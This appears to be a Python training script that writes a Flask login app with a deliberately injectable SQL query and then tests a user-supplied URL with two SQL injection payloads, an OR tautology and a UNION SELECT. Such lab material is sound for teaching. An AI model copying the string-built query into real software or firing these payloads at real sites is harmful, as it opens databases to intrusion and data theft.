#!/usr/bin/env python3
import sqlite3
import requests
import sys

# Educational vulnerable webapp + scanner
print("""
\033[1;34m
[§] SQL WRAITH - VULNERABLE APP & SCANNER
[§] DEPLOY: python3 sql_wraith.py --deploy
[§] TEST:   python3 sql_wraith.py --test
\033[0m
""")

def deploy_vuln_app():
    """Deploys a vulnerable Flask app for educational testing"""
    app_code = '''
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/')
def index():
    return """
    <form action="/login" method="GET">
        User: <input name="user"><br>
        Pass: <input name="pass"><br>
        <button>Login</button>
    </form>
    """

@app.route('/login')
def login():
    user = request.args.get('user', '')
    conn = sqlite3.connect('test.db')
    # VULNERABLE QUERY - DO NOT USE IN PRODUCTION
    query = f"SELECT * FROM users WHERE username='{user}'"
    result = conn.execute(query).fetchone()
    conn.close()
    return str(result) if result else "No user"

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
'''
    with open("vuln_app.py", "w") as f:
        f.write(app_code)
    
    # Create test DB
    conn = sqlite3.connect("test.db")
    conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT, password TEXT)")
    conn.execute("INSERT OR IGNORE INTO users VALUES ('admin', 'secret')")
    conn.commit()
    conn.close()
    
    print("\033[1;32m[✓] Vulnerable app deployed: python3 vuln_app.py\033[0m")

def test_sql_injection():
    target = input("[?] Target URL (http://127.0.0.1:5000/login): ").strip() or "http://127.0.0.1:5000/login"
    payloads = ["' OR '1'='1", "' UNION SELECT version(), user() --"]
    
    print("\n[*] Testing SQL injection vectors...\n")
    for payload in payloads:
        try:
            resp = requests.get(f"{target}?user={payload}&pass=test", timeout=5)
            if "admin" in resp.text or "UNION" in resp.text:
                print(f"\033[1;31m[!] VULNERABLE: {payload}\033[0m")
            else:
                print(f"\033[1;32m[✓] Safe: {payload}\033[0m")
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    if "--deploy" in sys.argv:
        deploy_vuln_app()
    elif "--test" in sys.argv:
        test_sql_injection()
    else:
        print("Usage: --deploy or --test")
